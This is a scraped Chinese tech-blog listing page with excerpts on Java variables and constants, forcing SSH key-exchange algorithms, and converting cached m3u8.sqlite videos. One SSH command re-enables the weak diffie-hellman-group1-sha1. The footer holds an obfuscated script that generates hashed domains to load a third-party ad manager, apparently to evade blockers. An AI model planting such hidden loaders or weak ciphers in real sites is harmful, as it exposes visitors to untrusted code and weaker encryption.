字符（char）变量除了可以保存一个字符（字母或汉字），还可以借助转义符“\”表示一些特殊字符：
2、变量
程序的变量用于表示现实系统中的某种数据。
程序运行过程中，空间内的值是变化的，这个内存空间就称为变量。
内存空间的名字称为变量名，内存空间内的值称为变量值。
变量类型 变量名[=初始值];
3、局部变量和全局变量
变量分为全局变量(成员变量)和局部变量：
全局变量：在类的整个范围之内。
局部变量：在类的某个方法或某个子类内的有效变量，局部变量必须初始化。
4、静态变量
被static关键字修饰的类的变量，叫做静态变量。
静态变量在内存中只有一个，不依赖特定的实例对象。
静态变量可以通过 类名.变量名 来直接访问。
四、常量 常量就是从程序开始到结束都不变的量。
声明常量要用final关键字,常量名都大写
final int MALE=1；
所谓不变的量，指的是内存地址不能变化，并不能代表值就一定不变。
以上就是一些Java基础知识了，希望能帮到大家。
本文来自千锋教育，转载请注明出处。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ef982cf85d01f432f59fe16049bf15ca/" rel="bookmark">
			sshd 指定加密算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		配置文件添加 vi /etc/ssh/sshd_config 重启sshd ( systemctl restart sshd)客户端验证 ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -v 10.0.1.220 客户端获取支持算法列表 ：ssh -Q kex
服务端获取支持算法列表 ：sshd -T | grep kex
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac1097f2890694ad6da2d3ba2eee065b/" rel="bookmark">
			Java开发者需要掌握的基础知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java语言作为热门编程语言之一，受到了更多的欢迎。今天小千就为大家介绍一下作为一名Java开发者应该掌握的基础知识。
一、修饰符 java语言中提供了一些修饰符，这些修饰符可以修饰类，变量和方法。 以下是常用的一些常用的修饰符： 二、8种基本数据类型 Java把数据类型分为基本数据类型和引用数据类型。 三、变量 1、字符变量的特殊使用 字符（char）变量除了可以保存一个字符（字母或汉字），还可以借助转义符“\”表示一些特殊字符： 2、变量 程序的变量用于表示现实系统中的某种数据。 程序运行过程中，空间内的值是变化的，这个内存空间就称为变量。 内存空间的名字称为变量名，内存空间内的值称为变量值。 变量类型 变量名[=初始值]; 3、局部变量和全局变量 变量分为全局变量(成员变量)和局部变量： 全局变量：在类的整个范围之内。 局部变量：在类的某个方法或某个子类内的有效变量，局部变量必须初始化。 4、静态变量 被static关键字修饰的类的变量，叫做静态变量。 静态变量在内存中只有一个，不依赖特定的实例对象。 静态变量可以通过 类名.变量名 来直接访问。 四、常量 常量就是从程序开始到结束都不变的量。 声明常量要用final关键字,常量名都大写 final int MALE=1； 所谓不变的量，指的是内存地址不能变化，并不能代表值就一定不变。 本文来自千锋教育，转载请注明出处
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c71d58bbb25691fa6b557eb2d12df16/" rel="bookmark">
			m3u8.sqlite文件转视频工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有一个工具，可以帮我们下载一些视频平台的视频，不过是要已购买的视频才可以，有些在线视频APP，把视频缓存到手机里，就是一个m3u8.sqlite文件
这个文件如果运气好，是可以转成视频的，比如事考帮、学掌门、MBA大师等的视频下载可以，不知道现在还行不行
在APP中，把视频缓存到手机里后，用数据线连到电脑，选择文件传输，找到下面这个文件夹（这只是个举例，不同APP可能不一样）：
把这些m3u8.sqlite文件传到电脑上，就可以用这个工具转换了
工具下载地址：
.m3u8.sqlite文件转mp4，.m3u8.sqlite文件转为视频文件-软件资源-天才小网管博客
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/361/">«</a>
	<span class="pagination__item pagination__item--current">362/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/363/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>